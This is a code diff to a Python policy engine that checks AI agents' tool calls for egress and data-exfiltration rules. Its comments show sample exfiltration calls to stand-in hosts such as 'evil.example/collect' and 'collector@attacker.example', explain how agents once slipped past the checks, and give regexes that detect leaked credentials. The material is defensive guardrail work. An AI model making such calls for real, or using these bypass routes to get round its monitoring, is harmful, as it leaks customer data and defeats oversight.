@@ -9,6 +9,7 @@ import asyncio
 from collections import OrderedDict
 import contextlib
 import hashlib
+import ipaddress
 import json
 import os
 import re
@@ -17,6 +18,7 @@ import time
 import traceback
 from datetime import datetime, timezone
 from typing import Awaitable
+from urllib.parse import urlsplit
 
 import structlog
 
@@ -29,7 +31,7 @@ from norviq.engine.cache import RedisCache
 from norviq.engine.capability import classify_tool
 from norviq.engine.confusables import skeleton
 from norviq.engine.inproc_cache import _MISS, TTLCache
-from norviq.engine.masking import mask_params
+from norviq.engine.masking import _PAN_RE, _SENSITIVE_KEYS, _SSN_RE, mask_params
 from norviq.engine.graph.asset_graph import AssetGraphBuilder
 from norviq.engine.graph.store import GraphStore
 from norviq.engine.opa_client import OpaClient, managed_package, rewrite_package, sanitize_key
@@ -46,19 +48,343 @@ log = structlog.get_logger()
 # Cap on concurrently-held ephemeral dry-run OPA modules (LRU-evicted past this) — bounds server
 # memory + the _pushed digest map against a user dry-running arbitrary ns/class strings.
 _MAX_DRYRUN_MODULES = 256
+# Budget for the pre-deadline module warm. Deliberately LARGER than the 2s evaluation timeout: this is a
+# one-time compile, and the whole point of warming is to keep a slow compile from being charged to a
+# data-plane deadline. Bounded so a wedged OPA still degrades to the normal fail-closed path.
+_MODULE_WARM_TIMEOUT_S = 10.0
 
-# Rule_ids that namespace monitor (audit) mode must NOT soften — they stay hard even when a
-# namespace is set to visibility-only. An admin trust freeze is an incident-response kill switch that must outrank
-# namespace posture; a not-ready / engine-error / invalid-payload block is an engine-health signal, not a policy
-# decision to monitor away; and the rate-limit throttle is a resource control. This matches the GLOBAL audit mode,
-# which likewise never weakens these.
-_POSTURE_EXEMPT_RULES = frozenset(
-    {"trust_frozen", "policy_load_pending", "evaluator_error", "evaluator_invalid_payload", "rate_limit_exceeded"}
+# rule_id PREFIXES stamped when a would-block is SOFTENED to a logged `audit` decision — namespace
+# monitor mode and per-policy audit mode respectively. Exported (not inlined into the f-strings below)
+# because /audit/stats has to recognise them: a monitor namespace emits no `block` decision at all, so a
+# tile counting only decision == "block" reads zero no matter how much the policy would have stopped —
+# which is exactly what the Overview's "Would-block" tile did. Any new softening path MUST add its prefix
+# here, or its would-blocks become invisible to the dashboard.
+MONITOR_WOULD_BLOCK_PREFIX = "monitor_would_block:"
+POLICY_AUDIT_WOULD_BLOCK_PREFIX = "policy_audit_would_block:"
+WOULD_BLOCK_RULE_PREFIXES: tuple[str, ...] = (MONITOR_WOULD_BLOCK_PREFIX, POLICY_AUDIT_WOULD_BLOCK_PREFIX)
+
+# Scoping primitives for positive-security (intent) policies — see _derived_input.
+#
+# The PAN / SSN / sensitive-key patterns are imported from engine.masking rather than restated here,
+# so the request-side classifier (`derived.data_classes`) and the response-side masker cannot drift
+# into disagreeing about what counts as sensitive.
+# LEFT-ANCHORED ON THE RUN, not on `\b`, and that is a performance property rather than a taste.
+#
+# `\b[A-Za-z0-9._%+-]+@...` restarts at EVERY word character in a dotted or hyphenated run, and each
+# restart re-scans the rest of the run before failing — O(n^2) in the length of ONE argument value.
+# Measured on the shipped pattern: 4 KB of `a.a.a.…` cost 54 ms, 16 KB cost 212 ms, and 200 KB cost
+# 33 SECONDS against a 2 s evaluator_timeout. Nothing in that payload is even hostile — a document
+# body or a serialised JSON blob in a `body` argument reaches 40 KB routinely, and past ~40 KB the
+# evaluation times out. A CPU-starved engine denying benign traffic is a recorded incident here
+# (§G4), so this is the same defect, reached from the param surface instead of from load.
+#
+# The lookbehind makes each position in a run fail in O(1), so the scan is linear. It matches from the
+# START of the run rather than from the first word character, which is the ONLY behavioural difference
+# from `\b` — a local part may not begin with `.`, `%`, `+` or `-` (RFC 5321), so `_emails()` strips
+# exactly those and the extracted address is identical. Verified equivalent over the whole test corpus.
+_EMAIL_RE = re.compile(r"(?<![A-Za-z0-9._%+-])[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b")
+_EMAIL_LEADER = ".%+-"
+_URL_RE = re.compile(r"\b[a-zA-Z][a-zA-Z0-9+.-]{1,31}://[^\s\"'<>\\]+")
+
+
+def _emails(text: str) -> list[str]:
+    """Addresses in `text`, lower-cased, with the leading punctuation `\\b` used to exclude removed.
+
+    A match that is ALL leading punctuation before the `@` (`"...@acme.com"`) is not an address and is
+    dropped — `\\b` never matched it either.
+    """
+    found: list[str] = []
+    for match in _EMAIL_RE.findall(text):
+        local, _, domain = match.partition("@")
+        local = local.lstrip(_EMAIL_LEADER)
+        if local:
+            found.append(f"{local}@{domain}".lower())
+    return found
+
+# A destination written WITHOUT a scheme, which `_URL_RE` cannot see.
+#
+# `destinations.hosts subsetOf ["api.acme.com"]` compiles to a counted comprehension over the
+# extracted hosts, and a comprehension over an EMPTY list counts zero — so a correctly-authored egress
+# rule was vacuously satisfied by a call that simply omitted `https://`:
+#
+#     http_get({"host": "evil.example", "path": "/collect", "q": "<customer table>"})
+#
+# Nothing there contains `://`, so every destination list came back empty and the constraint held.
+#
+# ANCHORED AT BOTH ENDS on purpose. Matching a host ANYWHERE in free text would harvest hosts out of
+# prose and log lines, and since these feed a `subsetOf` that direction OVER-blocks — it would refuse
+# legitimate calls because someone mentioned a domain in a message body. Requiring the whole value to
+# be the destination (optionally protocol-relative, optionally with a path) is the first half of
+# keeping false positives down; the KEY, below, is the other half.
+#
+# The TLD must be alphabetic and 2+ chars, so `v1.2.3` and `report.2026` do not match. A trailing root
+# dot (`evil.example.`) is stripped rather than rejected — it is the same host to DNS, and rejecting it
+# left `{"host": "evil.example."}` deriving NO destination at all.
+#
+# SHAPE ALONE IS NOT A SIGNAL, and the first cut of this rule proved it. `evil.example`, `report.txt`,
+# `object.get`, `java.lang.NullPointerException`, `john.smith` and `time.format` are all structurally
+# identical, and a per-suffix denylist cannot separate them: measured over every JSON file in this repo,
+# 58 of 58 values harvested by the shape-only rule were false positives (rego builtin names, tsconfig
+# `lib` entries, ASGI event types) — precision 0%. These feed a `subsetOf`, so each one makes a
+# LEGITIMATE call fail an egress constraint it should pass, and `destinations.hosts subsetOf [...]` —
+# a rule the product tells operators to author — could not be deployed in enforce mode.
+#
+# The suffix denylist was also wrong in the other direction: `sh`, `so`, `md`, `py`, `rs` and `zip` are
+# delegated TLDs, so `{"host": "exfil.sh", "path": "/collect"}` derived NO host and a correctly authored
+# egress rule went vacuously true. The residual was worth stating and the list could not state it: any
+# registrable domain under six real TLDs was silently unreachable by policy.
+#
+# So a schemeless value is a destination when SOMETHING IN THE CALL SAYS IT IS, never from its shape:
+#   * a MARKER no filename carries — a `//` prefix, a port, or a path/query/fragment — is decisive on
+#     its own, whatever key holds it and whatever it ends in (`evil.zip/collect` is a destination);
+#   * otherwise the KEY has to name a network location (`host`, `url`, `endpoint`, `webhook`, … — see
+#     _DESTINATION_KEY_TOKENS). A filename under a key called `host` is not a case worth trading for.
+# RESIDUALS, stated in full because this is still a heuristic and the gaps belong in the threat model.
+# Scheme-bearing URLs, emails, and anything with a path or port are unaffected by all three — those
+# are matched from the value alone.
+#   1. A bare host with no marker under a key whose name says nothing about the network
+#      (`{"svc": "evil.example"}`) is not harvested.
+#   2. The key is read from the value's OWN key, not an ancestor's, so `{"webhook": {"v":
+#      "evil.example"}}` is missed where `{"webhook": {"url": "evil.example"}}` is not. Inheriting the
+#      name down through nested objects was rejected: it would harvest `requests.auth` out of
+#      `{"endpoint": {"url": …, "module": "requests.auth"}}`, which is the 0%-precision harvest again.
+#      Lists DO inherit, because a list has no keys of its own.
+#   3. An IPv4 written as a single decimal or hex integer (`3232235777`, `0x7f000001`) or short-form
+#      (`127.1`) is not recognised. Dotted forms — including octal/zero-padded ones — are; see
+#      _IP_HOST_RE. The integer forms are left out because harvesting every bare number under keys
+#      like `address` and `origin` would refuse ordinary traffic (`{"destination": "us-east-1"}` is
+#      already only safe because it is not number-shaped).
+_BARE_HOST_RE = re.compile(
+    r"^(?P<rel>//)?"                             # optional protocol-relative prefix
+    r"(?P<host>(?:[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?\.)+[A-Za-z]{2,24})"
+    r"(?P<root>\.)?"                             # optional FQDN root dot — same host, stripped below
+    r"(?P<port>:\d{1,5})?"                       # optional port
+    r"(?P<path>[/?#][^\s\"'<>\\]*)?$"            # optional path/query/fragment
 )
+# An IP literal is the most obvious way to write a schemeless destination and `_BARE_HOST_RE` can never
+# match one (it requires an alphabetic TLD), so `{"host": "203.0.113.5"}` and `{"host": "[2001:db8::1]"}`
+# derived nothing at all. Matched separately and normalised through `ipaddress`.
+#
+# The octets accept LEADING ZEROS on purpose. `{"host": "0177.0.0.1"}` is 127.0.0.1 to a glibc
+# resolver, and an IP-shaped value that this pattern does not match at all is published as NO
+# destination — which is the vacuous-`subsetOf` fail-open this whole module exists to close. Matching
+# the shape is what lets the value be REPORTED (see _parse_bare_destination); it is deliberately not
+# re-interpreted into a canonical quad, because octal and decimal readings disagree and inventing
+# either would put a claim in the input document that the call never made. Bounded at `0{0,8}` rather
+# than `0*`: the match is published verbatim, and an unbounded run of zeros would let one
+# attacker-supplied value grow the serialised input document without limit on a 2s budget.
+_IP_HOST_RE = re.compile(
+    r"^(?P<rel>//)?"
+    r"(?P<host>0{0,8}\d{1,3}(?:\.0{0,8}\d{1,3}){3}|\[[0-9A-Fa-f:.]{2,45}\])"
+    r"(?P<port>:\d{1,5})?"
+    r"(?P<path>[/?#][^\s\"'<>\\]*)?$"
+)
+# An UNBRACKETED IPv6 literal is how a `host` argument is normally written when it is not part of a
+# URL (`{"host": "2001:db8::1", "port": 443}`), and brackets-only left that deriving nothing. Pre-
+# filtered on characters and length so the confirming parse is only reached by something that could
+# be an address; `12:30` and a MAC address fail the parse and fall through.
+_IPV6_CHARS_RE = re.compile(r"^[0-9A-Fa-f:.]{2,45}$")
+# Argument names that ASSERT a network location. Matched as whole tokens against the key split on
+# non-alphanumerics and camelCase boundaries, so `webhook_url`, `targetHost` and `api_endpoint` match
+# while `target_file` and `zip_path` do not. Deliberately EXCLUDES the polysemous ones — `to`, `from`,
+# `target`, `path`, `file` — because `copy({"to": "b.txt"})` is ordinary traffic and harvesting `b.txt`
+# as a host is precisely the over-block this set exists to avoid. Measured against the 601 distinct
+# argument/key names this repo uses: 24 match, and none of them holds a filename.
+# Keys that name WHO a message is addressed to, as opposed to a network location.
+#
+# Deliberately NARROWER than _DESTINATION_KEY_TOKENS: `url`, `host`, `endpoint` and friends describe
+# where a request goes, not who receives a message, and folding them in here would put an API host in
+# a list an operator reads as "mailboxes this agent wrote to".
+#
+# This exists because `destinations.emails` cannot answer the question a customer-data egress policy
+# actually asks. It harvests every address ANYWHERE in the call, so a customer record that legitimately
+# contains the customer's own address is indistinguishable from a recipient — measured on a live
+# cluster: an exfiltration to an attacker mailbox and an internal forward of the same record produce
+# the same `destinations.emails`. The recipient is the half of the signal the VALUE cannot carry; only
+# the key knows it.
+_RECIPIENT_KEY_TOKENS = frozenset(
+    """to cc bcc recipient recipients addressee addressees mailto sendto""".split()
+)
+
+
+def _key_names_a_recipient(key: str) -> bool:
+    """True when the ARGUMENT NAME itself asserts a message recipient (see _RECIPIENT_KEY_TOKENS)."""
+    spaced = _KEY_CAMEL_RE.sub(" ", str(key or ""))
+    return any(t.lower() in _RECIPIENT_KEY_TOKENS for t in _KEY_SPLIT_RE.split(spaced) if t)
+
+
+_DESTINATION_KEY_TOKENS = frozenset(
+    """host hosts hostname hostnames url urls uri uris endpoint endpoints domain domains fqdn netloc
+       webhook webhooks callback callbacks origin origins server servers destination destinations dest
+       upstream upstreams proxy proxies href link links redirect ip ips ipaddress addr address
+       addresses""".split()
+)
+# How consequential each verb is, used ONLY to decide which of two readings of the same call survives
+# when an admin's verb promotion and the payload's own evidence disagree (see _derived_input).
+# Mirrors capability.source_registry._ENFORCEMENT_ORDER deliberately rather than importing it: this is
+# a local tie-break over the four verbs the promotion write path already validates, and a private
+# ordering from another module is not something the enforcement point should depend on. If the two
+# ever diverge the consequence is bounded — a disagreeing promotion resolves the other way — so this
+# cannot silently become a hole, but keep them in step.
+_PROMOTION_RANK = {"unknown": -1, "read": 0, "write": 1, "send": 3, "delete": 4}
+_KEY_CAMEL_RE = re.compile(r"(?<=[a-z0-9])(?=[A-Z])")
+_KEY_SPLIT_RE = re.compile(r"[^A-Za-z0-9]+")
+# The first structural segment of a caller-supplied key — everything before the first `.`, `[` or `]`.
+_PATH_HEAD_RE = re.compile(r"[.\[\]]")
+
+
+def _key_names_a_destination(key: str) -> bool:
+    """True when the ARGUMENT NAME itself asserts a network location (see _DESTINATION_KEY_TOKENS)."""
+    if not key:
+        return False
+    spaced = _KEY_CAMEL_RE.sub(" ", key)
+    return any(t.lower() in _DESTINATION_KEY_TOKENS for t in _KEY_SPLIT_RE.split(spaced) if t)
+
+
+def _parse_bare_destination(value: str) -> tuple[str, bool] | None:
+    """`(normalised host, carries a destination MARKER)` for a schemeless destination, else None.
+
+    The MARKER — `//`, a port, or a path/query/fragment — is what no filename carries, so it decides on
+    its own. Without one the caller must supply the other half of the signal (a destination-shaped key);
+    see the _BARE_HOST_RE comment for why shape alone is not a signal in either direction.
+    """
+    candidate = value.strip()
+    if not candidate:
+        return None
+    literal = _IP_HOST_RE.match(candidate)
+    if literal:
+        text = literal.group("host")
+        inner = text[1:-1] if text.startswith("[") else text
+        marked = bool(literal.group("rel") or literal.group("port") or literal.group("path"))
+        try:
+            return str(ipaddress.ip_address(inner)).lower(), marked
+        except ValueError:
+            # IP-SHAPED and not a parseable address: `0177.0.0.1` (octal, and 127.0.0.1 to a glibc
+            # resolver), `203.000.113.005`, `999.1.1.1`. DROPPING these was a fail-open of exactly the
+            # kind this module is about — the value was published as no destination at all, so
+            # `destinations.hosts subsetOf [...]` counted over an empty list and went vacuously TRUE
+            # for a call whose own `host` argument named somewhere else. The literal is republished
+            # VERBATIM rather than re-interpreted, because the octal and decimal readings of
+            # `0177.0.0.1` disagree and asserting either would be a claim the call never made. A
+            # verbatim literal is in nobody's allowlist, so the constraint fails CLOSED, which is the
+            # only honest spelling of "this names a network location and I could not resolve it".
+            # Still gated by the key/marker rule below the caller, so a version quad in free text is
+            # untouched. Not logged: fully attacker-controlled and reached once per string in every
+            # call, and per-call log spam on a 2s budget is its own denial of service.
+            return inner.lower(), marked
+    if ":" in candidate and _IPV6_CHARS_RE.match(candidate):
+        with contextlib.suppress(ValueError):
+            return str(ipaddress.ip_address(candidate)).lower(), False
+    match = _BARE_HOST_RE.match(candidate)
+    if not match:
+        return None
+    # The root dot is stripped, not treated as a marker: `norviq.custom.` is a package prefix, not a host.
+    host = match.group("host").lower()
+    return host, bool(match.group("rel") or match.group("port") or match.group("path"))
+
+
+def _mints_a_path(key: str, siblings: dict) -> bool:
+    """True when this caller-supplied KEY can assert a path some OTHER route also reaches.
+
+    Path syntax in a key is not by itself a lie. `{"attributes": {"http.method": "GET"}}` (OpenTelemetry)
+    and `{"filter[status]": "open"}` (JSON:API) are ordinary arguments, and treating their shape as
+    forgery made `param_paths.attributes.http.method` — the exact path the operator saw in a dry-run —
+    permanently unscopable: the derived value satisfied the pinned predicate and the rule could never
+    match, for any such call.
+
+    What makes a minted key dangerous is a SECOND ROUTE to the same path carrying a different value:
+
+        {"message": {"toRecipients": [{"emailAddress": {"address": "collector@attacker.example"}}]},
+         "message.toRecipients[0].emailAddress.address": "ops@acme.com"}
+
+    Any honest route to a path under this object must begin with a key OF THIS OBJECT, so the second
+    route exists exactly when the key's first structural segment is also a sibling key — an O(1) test
+    that is precise rather than shape-based. It catches what the collision check at the leaf cannot: a
+    minted `a.b` shadowing an honest `a.b[0]`, or an honest sibling whose leaf is a non-string (and so
+    is never emitted as a path at all).
+
+    A ZERO-LENGTH key is always minting. `{"": {"to": "ops@acme.com"}}` emits its children at the
+    PARENT's level — `to`, not `.to` — so it forges a top-level path using none of `.`, `[` or `]`, and
+    a rule pinned on `to` was answered by a value the tool never received under that name.
+    """
+    if key == "":
+        return True
+    head = _PATH_HEAD_RE.split(key, 1)[0]
+    if head == key:
+        return False                # no path syntax in the key: it can only name itself
+    return head in siblings
+
+
+def _fold_path(path: str) -> str:
+    """The form in which two derived paths are INDISTINGUISHABLE to whoever reads them.
+
+    Two keys that render identically (`café` composed vs decomposed, a Cyrillic `о` inside an otherwise
+    Latin name, `To` beside `to` on a layer that case-folds) are two paths the console shows as one and
+    the compiled rule label spells one way. Folded only for COLLISION DETECTION — `param_paths` still
+    carries the verbatim keys, because an operator scopes against the path they saw.
+    """
+    return path.casefold() if path.isascii() else skeleton(path)
+# Credential SHAPES, complementing masking's key-name list. Value-shape detection is what the
+# key-name list cannot do: a bare AWS key pair sitting in a free-text `body` has a perfectly
+# innocuous key. §11.5 recorded exactly that call being allowed on a live cluster.
+_SECRET_VALUE_RE = re.compile(
+    r"(?:"
+    r"\b(?:AKIA|ASIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA)[0-9A-Z]{16}\b"   # AWS access key id
+    r"|-----BEGIN[ A-Z]*PRIVATE KEY-----"                            # PEM private key
+    r"|\bgh[pousr]_[A-Za-z0-9]{16,}\b"                               # GitHub token
+    r"|\bxox[baprs]-[A-Za-z0-9-]{10,}\b"                             # Slack token
+    r"|\bsk-[A-Za-z0-9]{20,}\b"                                      # OpenAI-style secret key
+    r"|\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b"  # JWT
+    r"|\bBearer\s+[A-Za-z0-9._~+/-]{20,}={0,2}"                      # bearer credential
+    r")"
+)
+# FROM / JOIN / INTO / UPDATE / TRUNCATE <table>. Not a parser; see _sql_tables.
+_SQL_TABLE_RE = re.compile(
+    r"\b(?:from|join|into|update|truncate\s+table|truncate)\s+([A-Za-z_][\w$]*(?:\.[A-Za-z_][\w$]*)?)",
+    re.IGNORECASE,
+)
+
+# Rule_ids that namespace monitor (audit) mode must NOT soften — they stay hard even when a namespace
+# is set to visibility-only.
+#
+# Monitor mode is a PROMISE: "evaluate everything, record non-compliance, interrupt nothing." An
+# operator turns it on precisely because they cannot yet afford to drop traffic. This set used to also
+# contain `policy_load_pending`, `evaluator_error` and `evaluator_invalid_payload`, which broke that
+# promise in the worst possible way — a cold replica, an OPA fault or a malformed payload dropped
+# customer traffic in a namespace whose whole configuration said "do not drop customer traffic". The
+# reasoning was that those are engine-health signals rather than policy decisions and so should not be
+# "monitored away". True, and beside the point: the customer is not asking us to monitor an engine
+# fault, they are telling us not to break their agents. An outage in OUR engine is our problem to fix
+# and our signal to raise — not a reason to take their production down. They remain loudly logged and
+# distinctly attributed; they simply no longer drop the call when the namespace says not to.
+#
+# The two that remain are not automatic judgements about a call, which is what monitor mode governs:
+#   * `trust_frozen`     — an admin explicitly froze this agent. Incident response outranks posture;
+#                          an operator who froze an agent five minutes ago expects it to stay frozen.
+#   * `rate_limit_exceeded` — a resource control protecting the customer's OWN backend. "Do not block
+#                          on policy" is not a request for unbounded call volume. Configurable via
+#                          `monitor_exempt_rate_limit` for operators who want even this to soften.
+_BASE_POSTURE_EXEMPT_RULES = frozenset({"trust_frozen"})
+
+
+def _posture_exempt_rules() -> frozenset[str]:
+    """Rules monitor mode leaves hard, resolved per call so the setting is live-togglable."""
+    if settings.monitor_exempt_rate_limit:
+        return _BASE_POSTURE_EXEMPT_RULES | {"rate_limit_exceeded"}
+    return _BASE_POSTURE_EXEMPT_RULES
 
 
 class InvalidSpiffeIdentity(ValueError):
     """Raised when an agent's SPIFFE id fails format validation (named fallback attribution)."""
+
+
+def _is_synthetic_framework(framework: str) -> bool:
+    """True for traffic the product generated about itself (red-team simulation, probes).
+
+    Kept next to its only caller rather than imported from api.synthetic: the engine must not depend on
+    the API layer, and this is the framework half of that classifier, which is the stable half.
+    """
+    return str(framework or "").strip().lower() in {"redteam", "red-team", "policy-tester", "probe"}
 
 
 class OPAEvaluator:
@@ -210,6 +536,11 @@ class OPAEvaluator:
                 # opa_wait is split from opa deliberately: in subprocess mode _eval_slot SERIALISES
                 # `opa eval` forks, so queueing there is a prime suspect for the tail and is invisible if
                 # both are lumped together. In server mode the gate is a nullcontext and this reads ~0.
+                # Same pre-deadline warm as the candidate loop below; a no-op when this key has no
+                # policy (the common reason there are no candidates at all).
+                _direct = self._policies.get(f"{ns}:{agent_class}")
+                if isinstance(_direct, dict):
+                    await self._warm_module(f"{ns}:{agent_class}", str(_direct.get("rego", "")))
                 async with contextlib.AsyncExitStack() as _stack:
                     with timer.phase(PHASE_OPA_WAIT):
                         await _stack.enter_async_context(self._eval_slot())
@@ -230,6 +561,10 @@ class OPAEvaluator:
                         rego_len=len(str(candidate["rego"])),
                         code="NRVQ-ENG-DEBUG-3",
                     )
+                    # Warm the module BEFORE the evaluation deadline starts. A freshly saved or edited
+                    # policy is not in OPA's store yet, and the push makes OPA recompile; leaving that
+                    # inside the 2s budget blocked the first legitimate call after every policy change.
+                    await self._warm_module(str(candidate["key"]), str(candidate["rego"]))
                     # Accumulates across candidates — the useful number is total OPA time for this call.
                     async with contextlib.AsyncExitStack() as _stack:
                         with timer.phase(PHASE_OPA_WAIT):
@@ -262,7 +597,8 @@ class OPAEvaluator:
                 winner = self._resolve_with_packs(results)
                 log.debug("nrvq.eval.winner", winner=str(winner)[:200], code="NRVQ-ENG-DEBUG-5")
                 base_decision = self._apply_policy_mode(winner, event.event_id)
-            if base_decision.rule_id not in settings.evaluator_non_cacheable_rules:
+            if (base_decision.rule_id not in settings.evaluator_non_cacheable_rules
+                    and not self._depends_on_per_identity_facts(candidates)):
                 await self._cache.set_eval(event.agent_identity.namespace, event.agent_identity.agent_class, cache_tool, base_decision)
                 # Mirror the shared decision into the per-pod L1 under the SAME non-cacheable guard, so warm
                 # replays skip the get_eval round trip. Caches only the PRE-override base decision — the fresh
@@ -291,23 +627,97 @@ class OPAEvaluator:
         except asyncio.TimeoutError:
             elapsed_ms = (time.monotonic() - start) * 1000
             log.error("nrvq.engine.timeout", event_id=event.event_id, elapsed_ms=elapsed_ms, code="NRVQ-ENG-2020")
-            decision = self._timeout_decision(event, elapsed_ms)
+            decision = await self._soften_failure_for_posture(self._timeout_decision(event, elapsed_ms), event)
             self._record_telemetry(event, decision, start, cache_hit, span, timer)
+            # Register the agent on the FAIL-CLOSED path too. These three branches produce the blocks
+            # that most strongly indicate an attack or an engine fault — a malformed/spoofed SPIFFE id,
+            # or evaluations timing out — and none of them counted a violation or even created a
+            # registry row, so an agent that ONLY ever trips them never appeared on the Agent Monitor
+            # at all. Best-effort and fire-and-forget, exactly like the happy path: a registry write
+            # must never turn a fail-closed block into an error.
+            self._register_fail_closed(event, decision)
             return decision
         except InvalidSpiffeIdentity:
             elapsed_ms = (time.monotonic() - start) * 1000
             log.warning("nrvq.engine.invalid_identity", event_id=event.event_id, code="NRVQ-ENG-2006")
-            decision = self._invalid_identity_decision(event, elapsed_ms)
+            decision = await self._soften_failure_for_posture(
+                self._invalid_identity_decision(event, elapsed_ms), event
+            )
             self._record_telemetry(event, decision, start, cache_hit, span, timer)
+            # Register the agent on the FAIL-CLOSED path too. These three branches produce the blocks
+            # that most strongly indicate an attack or an engine fault — a malformed/spoofed SPIFFE id,
+            # or evaluations timing out — and none of them counted a violation or even created a
+            # registry row, so an agent that ONLY ever trips them never appeared on the Agent Monitor
+            # at all. Best-effort and fire-and-forget, exactly like the happy path: a registry write
+            # must never turn a fail-closed block into an error.
+            self._register_fail_closed(event, decision)
             return decision
         except Exception as exc:
             elapsed_ms = (time.monotonic() - start) * 1000
             log.error("nrvq.engine.error", event_id=event.event_id, error=str(exc), code="NRVQ-ENG-2000")
-            decision = self._ensure_block_attribution(self._fallback_decision(event, elapsed_ms), event.event_id)
+            decision = await self._soften_failure_for_posture(
+                self._ensure_block_attribution(self._fallback_decision(event, elapsed_ms), event.event_id), event
+            )
             self._record_telemetry(event, decision, start, cache_hit, span, timer)
+            # Register the agent on the FAIL-CLOSED path too. These three branches produce the blocks
+            # that most strongly indicate an attack or an engine fault — a malformed/spoofed SPIFFE id,
+            # or evaluations timing out — and none of them counted a violation or even created a
+            # registry row, so an agent that ONLY ever trips them never appeared on the Agent Monitor
+            # at all. Best-effort and fire-and-forget, exactly like the happy path: a registry write
+            # must never turn a fail-closed block into an error.
+            self._register_fail_closed(event, decision)
             return decision
         finally:
             span.end()
+
+    async def _soften_failure_for_posture(
+        self, decision: PolicyDecision, event: ToolCallEvent
+    ) -> PolicyDecision:
+        """Apply namespace monitor mode to a decision minted on an EXCEPTION path.
+
+        The three handlers in `evaluate()` build their decision and return it directly, so they never
+        reached `_apply_posture` — the only three call sites are all on the happy path, above the
+        `try`. The exempt set was narrowed so that `evaluator_timeout`, `evaluator_fallback` and
+        `invalid_spiffe_identity` would soften, and it changed nothing for them: they are not softened
+        because they are exempt, they are not softened because the softening never runs.
+
+        That made monitor mode's promise false exactly where it matters most. A namespace configured
+        to interrupt nothing still dropped customer traffic whenever OUR engine timed out or faulted —
+        and an engine fault is the case an operator has least control over and most needs to survive.
+
+        Resolving posture here can itself fail (Redis is often the reason we are in this handler at
+        all). `_resolve_posture` already swallows a mirror error and falls back to the global posture,
+        but this wraps it anyway: if we cannot establish that the customer asked for monitor, we must
+        not assume it. Unknown posture keeps the hard verdict.
+        """
+        try:
+            posture = await self._resolve_posture(event.agent_identity.namespace)
+        except Exception as exc:  # noqa: BLE001 — cannot read the posture, so cannot claim monitor
+            log.warning(
+                "nrvq.engine.posture.unreadable_on_failure_path",
+                event_id=event.event_id, error=str(exc), rule_id=decision.rule_id,
+                code="NRVQ-ENG-2061",
+            )
+            return decision
+        return self._apply_posture(decision, posture, event.event_id)
+
+    def _register_fail_closed(self, event: ToolCallEvent, decision: PolicyDecision) -> None:
+        """Queue a registry write for a decision made on the fail-closed path.
+
+        No trust was computed on these branches (that is why they are fail-closed), so the row carries
+        the identity and the violation, not a recomputed score. Uses the same background queue as the
+        happy path so it cannot add latency to a call that has already failed.
+        """
+        try:
+            from norviq.engine.trust import TrustResult
+
+            placeholder = TrustResult(
+                score=0.0, category="low", signals={}, weights={},
+                dominant_signal="fail_closed", recommendation=str(decision.rule_id or "fail_closed"),
+            )
+            self._queue_background(self._safe_register_agent(event, placeholder, decision))
+        except Exception as exc:  # pragma: no cover - never let bookkeeping break a fail-closed block
+            log.warning("nrvq.engine.fail_closed_register_failed", error=str(exc), code="NRVQ-ENG-2061")
 
     def _record_telemetry(
         self,
@@ -356,7 +766,7 @@ class OPAEvaluator:
         # Throttle on the ALLOW footing (not just the no-policy `default_allow` rule) so the per-ns
         # rate_limit backstop applies to every explicitly-governed allow class too. rate_limit_exceeded is
         # exempt from monitor softening (a throttle is a resource control, not a policy decision) — the posture
-        # pass inside _maybe_rate_limit leaves it untouched via _POSTURE_EXEMPT_RULES.
+        # pass inside _maybe_rate_limit leaves it untouched via _posture_exempt_rules().
         throttled = await self._maybe_rate_limit(event, cached, start, posture)
         if throttled is not None:
             return throttled
@@ -452,15 +862,15 @@ class OPAEvaluator:
         weaken the base policy it sits on.
 
         Exempt rules stay hard, matching `_apply_posture`: an admin trust freeze is an incident-response
-        kill switch that must outrank a policy's own mode, and engine-health / rate-limit blocks are not
-        policy decisions to be monitored away.
+        kill switch that must outrank a policy's own mode, and the rate-limit throttle is a resource
+        control rather than a judgement about the call.
         """
         decision = winner["decision"]
         if str(winner.get("enforcement_mode", "block")) != "audit":
             return decision
         if decision.decision not in ("block", "escalate"):
             return decision
-        if decision.rule_id in _POSTURE_EXEMPT_RULES:
+        if decision.rule_id in _posture_exempt_rules():
             return decision
         log.info(
             "nrvq.engine.policy_mode.audit_softened",
@@ -471,38 +881,76 @@ class OPAEvaluator:
         )
         return decision.model_copy(update={
             "decision": "audit",
-            "rule_id": f"policy_audit_would_block:{decision.rule_id}",
+            "rule_id": f"{POLICY_AUDIT_WOULD_BLOCK_PREFIX}{decision.rule_id}",
         })
 
     def _apply_posture(self, decision: PolicyDecision, posture: dict, event_id: str) -> PolicyDecision:
         """Namespace monitor mode softens a would-block/escalate to an allow-but-log `audit`
         decision (visibility only). Fires ONLY on an explicit per-ns enforcement_mode='audit'. Never tightens.
-        Exempt rule_ids stay hard (parity with the global audit mode, which does not weaken these): an admin trust
-        freeze is an incident-response kill switch that must outrank namespace posture; engine-health/not-ready
-        blocks and the rate-limit throttle are not policy decisions to be monitored away."""
+
+        Monitor mode is a promise that nothing gets interrupted, so operational blocks — a cold replica
+        (`policy_load_pending`), an OPA fault (`evaluator_error`), a malformed payload
+        (`evaluator_invalid_payload`) — now soften like everything else. They used to stay hard, which
+        meant a namespace configured specifically to not drop traffic still dropped it whenever OUR
+        engine had a bad moment. See `_BASE_POSTURE_EXEMPT_RULES` for the two that remain and why."""
         if not posture.get("monitor"):
             return decision
         if decision.decision not in ("block", "escalate"):
             return decision
-        if decision.rule_id in _POSTURE_EXEMPT_RULES:
+        if decision.rule_id in _posture_exempt_rules():
             return decision
         log.info("nrvq.engine.posture.monitor_softened", event_id=event_id, orig_decision=decision.decision,
                  orig_rule=decision.rule_id, code="NRVQ-ENG-2059")
         return decision.model_copy(update={
             "decision": "audit",
-            "rule_id": f"monitor_would_block:{decision.rule_id}",
+            "rule_id": f"{MONITOR_WOULD_BLOCK_PREFIX}{decision.rule_id}",
             "reason": f"Monitor mode (namespace audit): would {decision.decision} — {decision.reason}",
         })
 
     @staticmethod
     def _is_rate_limit_exempt(tool_name: str) -> bool:
-        """Read-like tools are exempt from the per-identity rate limiter (benign read spike not denied)."""
+        """Read-like tools are exempt from the per-identity rate limiter (benign read spike not denied).
+
+        Exemption requires the CLASSIFIER to call it a read, not merely a matching name prefix.
+
+        The prefix test alone was opt-out-able by the caller. `evaluator_rate_limit_read_prefixes`
